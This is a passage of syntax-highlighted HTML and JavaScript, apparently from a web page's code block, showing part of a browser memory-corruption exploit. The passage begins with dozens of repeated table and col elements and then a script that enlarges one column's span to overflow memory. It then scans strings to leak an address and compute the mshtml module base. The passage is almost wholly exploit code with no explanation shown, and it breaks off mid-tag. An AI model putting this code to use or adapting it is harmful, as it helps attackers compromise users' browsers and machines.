class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"69"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"70"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"71"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"72"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"73"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"74"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"75"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"76"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"77"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"78"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"79"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"80"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"81"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"82"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"83"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"84"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"85"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"86"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"87"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"88"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"89"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"90"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"91"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"92"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"93"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"94"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"95"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"96"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"97"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"98"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"99"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"100"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"101"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"102"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"103"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"104"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"105"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"106"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"107"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"108"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"109"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"110"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"111"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"112"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"113"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"114"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"115"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"116"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"117"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"118"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"119"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"120"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"121"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"122"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"123"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"124"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"125"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"126"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"127"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"128"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"129"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"130"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"131"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span><span class="tag">&lt;<span class="name">table</span> <span class="attr">style</span>=<span class="string">"table-layout:fixed"</span> &gt;</span><span class="tag">&lt;<span class="name">col</span> <span class="attr">id</span>=<span class="string">"132"</span> <span class="attr">width</span>=<span class="string">"41"</span> <span class="attr">span</span>=<span class="string">"9"</span> &gt;</span>&amp;nbsp <span class="tag">&lt;/<span class="name">col</span>&gt;</span><span class="tag">&lt;/<span class="name">table</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">'javascript'</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="undefined">    var obj_col = document.getElementById("132");</span></span><br><span class="line"><span class="undefined">	obj_col.span = 19;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span class="undefined">function over_trigger() &#123;</span></span><br><span class="line"><span class="undefined">    var leak_addr = -1;</span></span><br><span class="line"><span class="undefined">    for ( var i = 0; i &lt; 500; i++ ) &#123;</span></span><br><span class="line"><span class="undefined">        if ( arr[i].length &gt; (0x100-6)/2 ) &#123; // overflowed</span></span><br><span class="line"><span class="undefined">			leak_index = i;</span></span><br><span class="line"><span class="undefined">            var leak = arr[i].substring((0x100-6)/2+(2+8)/2, (0x100-6)/2+(2+8+4)/2);</span></span><br><span class="line"><span class="undefined">            leak_addr = parseInt( leak.charCodeAt(1).toString(16) + leak.charCodeAt(0).toString(16), 16 );</span></span><br><span class="line"><span class="undefined">			mshtmlbase = leak_addr - Number(0x001582b8);</span></span><br><span class="line"><span class="undefined">			alert(mshtmlbase);</span></span><br><span class="line"><span class="undefined">            break;</span></span><br><span class="line"><span class="undefined">        &#125;</span></span><br><span class="line"><span class="undefined">    &#125;</span></span><br><span class="line"><span class="undefined">    if ( leak_addr == -1 || leak_index == -1 ) &#123; alert("memory leak failed...."); &#125;</span></span><br><span class="line"><span class="undefined">//return mshtmlbase;</span></span><br><span class="line"><span class="undefined">&#125;</span></span><br><span class="line"><span class="undefined"></span></span><br><span class="line"><span 